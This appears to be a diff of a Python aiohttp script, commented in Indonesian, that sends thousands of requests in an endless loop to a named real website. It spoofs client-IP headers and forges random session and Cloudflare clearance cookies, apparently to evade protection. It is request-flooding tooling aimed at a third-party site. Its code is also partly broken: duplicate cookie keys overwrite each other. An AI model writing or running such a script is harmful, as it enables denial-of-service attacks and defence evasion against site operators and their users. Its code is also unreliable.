@@ -1,18 +1,20 @@
 import aiohttp
 import asyncio
-import uuid
+import secrets  # Import modul secrets untuk nilai acak
 
 # Konfigurasi IP palsu
 fake_ip_range = '28.0.0.1/8'
 fake_ip_filter = ['*.lan', '*.local']
 nameserver = ['1.1.1.1']
 
-# Buat kustom header dengan alamat IP palsu dan session ID palsu
+# Buat kustom header dengan alamat IP palsu dan cookie palsu
 custom_headers = {
     'X-Forwarded-For': fake_ip_range,
     'X-Client-IP': fake_ip_range,
-    'Host': 'sxtcp.tg-index.workers.dev',  # Ganti dengan host yang sesuai
-    'Session-ID': str(uuid.uuid4())  # Session ID palsu
+    'cookie': f'PHPSESSID={secrets.token_hex(16)}',  # Cookie palsu dengan nilai acak
+    'cookie': f'adLastShownTime={secrets.token_hex(16)}',
+    'cookie': f'adViewCount={secrets.token_hex(16)}',
+    'cookie': f'cf_clearance={secrets.token_hex(16)}'
 }
 
 async def send_request(url):
@@ -25,8 +27,8 @@ async def send_request(url):
         return None
 
 async def main():
-    default_url = 'https://sxtcp.tg-index.workers.dev'  # URL default
-    num_requests = 5009  # Jumlah permintaan yang ingin Anda kirim
+    default_url = 'https://doujindesu.tv'  # URL default
+    num_requests = 9000 # Jumlah permintaan yang ingin Anda kirim
 
     while True:
         # Inisialisasi list untuk menyimpan hasil respons
